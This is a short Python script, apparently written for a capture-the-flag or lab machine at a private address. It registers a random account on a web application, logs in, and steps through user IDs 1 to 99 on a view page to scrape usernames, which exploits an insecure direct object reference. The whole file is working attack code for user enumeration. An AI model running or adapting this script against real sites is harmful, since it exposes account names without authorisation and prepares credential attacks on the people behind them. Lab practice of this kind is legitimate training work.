#!/usr/bin/env python3
import requests
import random
import re

target   = "http://10.10.117.224"
register = "/users/register.php"
login    = "/users/login.php"
view     = "/users/view.php?userid="

# generate random username
usr = random.getrandbits(128)
pwd = usr

# Create a user
print("[INFO] Create random user")
data = {
	"username":usr,
	"firstname":usr,
	"lastname":usr,
	"password":pwd,
	"againpass":pwd
	}
r = requests.post(target+register, data=data)
#print(r.text)
print("[INFO] Random user successfully created")

with requests.Session() as s:
	# Now login with new user
	print("[INFO] Connect with {}".format(usr))
	data = {
		"username":usr,
		"password":pwd
		}
	s.post(target+login, data=data)
	print("[INFO] User {} successfully connected".format(usr))

	# List users
	print("[INFO] Listing users")
	for i in range(1,100):
		r = s.get(target+view+str(i))
		# extract username from <h2>These are bob&#39;s Pictures: </h2>
		if "<h2>These are" in r.text:
			g = re.search("<h2>(.*)</h2>", r.text)
			print("====================")
			print("User ID: {}".format(str(i)))
			print(g.group(1))
